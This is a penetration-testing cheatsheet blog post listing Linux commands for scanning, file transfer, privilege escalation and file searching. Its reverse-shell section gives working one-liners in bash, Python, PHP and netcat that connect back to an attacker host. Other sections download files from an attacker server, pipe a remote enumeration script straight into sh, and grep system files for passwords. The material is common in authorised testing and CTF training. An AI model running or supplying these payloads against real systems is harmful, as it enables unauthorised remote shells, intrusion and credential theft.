+++
title = "Essential Linux Commands for Penetration Testing"
date = "2023-08-17"
author = "Zeus"
cover = ""
tags = ["linux", "commands", "cheatsheet", "penetration-testing"]
description = "A quick reference guide for essential Linux commands used during penetration testing."
showFullContent = false
+++

# Essential Linux Commands for Penetration Testing

This cheatsheet contains the most commonly used Linux commands during penetration testing engagements. Having these commands at your fingertips can save valuable time during CTFs, OSCP exam, or real-world assessments.

## Network Enumeration

### Network Scanning
```bash
# Basic nmap scan
nmap -sC -sV -oA initial_scan <target_ip>

# Full port scan
nmap -p- --min-rate 5000 -T4 <target_ip>

# UDP scan
nmap -sU -p 53,67,68,69,123,161,162 <target_ip>

# Vulnerability scanning
nmap --script vuln <target_ip>
```

### Network Connections
```bash
# List all listening ports
netstat -tuln

# Check established connections
netstat -tuplan

# Show routing table
route -n
ip route show
```

## File Transfer

### HTTP Server
```bash
# Python HTTP server
python3 -m http.server 8000

# PHP server
php -S 0.0.0.0:8000
```

### File Download
```bash
# wget
wget http://<attacker_ip>:8000/file.txt

# curl
curl -O http://<attacker_ip>:8000/file.txt

# PowerShell (from Windows)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>:8000/file.exe', 'C:\Windows\Temp\file.exe')"
```

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/sh <attacker_ip> 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 4444 >/tmp/f
```

## Privilege Escalation

### Basic Enumeration
```bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release

# User information
id
who
last

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

### Automated Enumeration Tools
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

## File Manipulation

### Search for Files
```bash
# Find files by name
find / -name "*.conf" 2>/dev/null

# Find files by permission
find / -writable -type f 2>/dev/null

# Find files by owner
find / -user root -perm -4000 2>/dev/null
```

### Text Manipulation
```bash
# Search for string in files
grep -r "password" /etc/ 2>/dev/null

# Extract specific lines
cat file.txt | grep -A 3 -B 2 "keyword"

# Basic awk usage
cat /etc/passwd | awk -F: '{print $1":"$3":"$6}'
```

## Remember

This is just a basic reference. Always adapt commands to your specific situation and target environment. Keep learning and expanding your toolkit!

---

*Disclaimer: Use these commands ethically and only on systems you have permission to test.*
